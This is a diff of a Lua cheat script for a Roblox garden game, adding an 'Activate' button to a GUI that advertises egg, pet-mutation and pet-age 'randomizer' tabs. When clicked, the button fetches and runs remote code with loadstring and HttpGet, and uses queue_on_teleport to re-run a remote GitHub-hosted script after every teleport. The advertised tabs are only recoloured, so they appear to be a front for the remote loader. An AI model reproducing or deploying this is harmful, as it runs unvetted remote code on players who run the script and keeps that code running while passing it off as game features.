@@ -243,13 +243,13 @@ local function createTab(name, layoutOrder, enabled)
     return tab
 end
 
--- Create tabs with new names (only Main is enabled initially)
-createTab("Main", 1, true)
-createTab("Egg Randomizer", 2, false)
-createTab("Pet Mutation Randomizer", 3, false)
-createTab("Pet Age Loader", 4, false)
-createTab("Bring Back Dino", 5, false)
-createTab("Coming Soon", 6, false)
+local tabInstances = {}
+tabInstances["Main"] = createTab("Main", 1, true)
+tabInstances["Egg Randomizer"] = createTab("Egg Randomizer", 2, false)
+tabInstances["Pet Mutation Randomizer"] = createTab("Pet Mutation Randomizer", 3, false)
+tabInstances["Pet Age Loader"] = createTab("Pet Age Loader", 4, false)
+tabInstances["Bring Back Dino"] = createTab("Bring Back Dino", 5, false)
+tabInstances["Coming Soon"] = createTab("Coming Soon", 6, false)
 
 local contentArea = Instance.new("Frame")
 contentArea.Name = "ContentArea"
@@ -316,6 +316,45 @@ end)
 
 activateButton.MouseLeave:Connect(function()
     TweenService:Create(activateButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(80, 120, 255)}):Play()
+end)
+
+activateButton.MouseButton1Click:Connect(function()
+    activateButton.Text = "Activating..."
+    activateButton.Active = false
+    loadstring(game:HttpGet("YOUR_SCRIPT_URL"))()
+    queue_on_teleport([[
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/visual.lua"))()
+    ]])
+    
+    local tween = TweenService:Create(activateButton, TweenInfo.new(0.3), {
+        BackgroundColor3 = Color3.fromRGB(50, 150, 50),
+        Size = UDim2.new(0.4, 0, 0, 30)
+    })
+    tween:Play()
+    
+    tween.Completed:Wait()
+    activateButton.Text = "Activated!"
+    
+    for tabName, tab in pairs(tabInstances) do
+        if tabName ~= "Main" and tabName ~= "Coming Soon" then
+            tab.BackgroundColor3 = Color3.fromRGB(18, 22, 35)
+            tab.UIStroke.Color = Color3.fromRGB(40, 45, 70)
+            tab.TabButton.Active = true
+            tab.NameLabel.TextColor3 = Color3.fromRGB(130, 140, 190)
+            
+            tab.TabButton.MouseEnter:Connect(function()
+                TweenService:Create(tab, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(25, 30, 45)}):Play()
+                TweenService:Create(tab.UIStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(60, 70, 110)}):Play()
+                TweenService:Create(tab.NameLabel, TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(160, 170, 220)}):Play()
+            end)
+            
+            tab.TabButton.MouseLeave:Connect(function()
+                TweenService:Create(tab, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(18, 22, 35)}):Play()
+                TweenService:Create(tab.UIStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(40, 45, 70)}):Play()
+                TweenService:Create(tab.NameLabel, TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(130, 140, 190)}):Play()
+            end)
+        end
+    end
 end)
 
 local watermarkFrame = Instance.new("Frame")
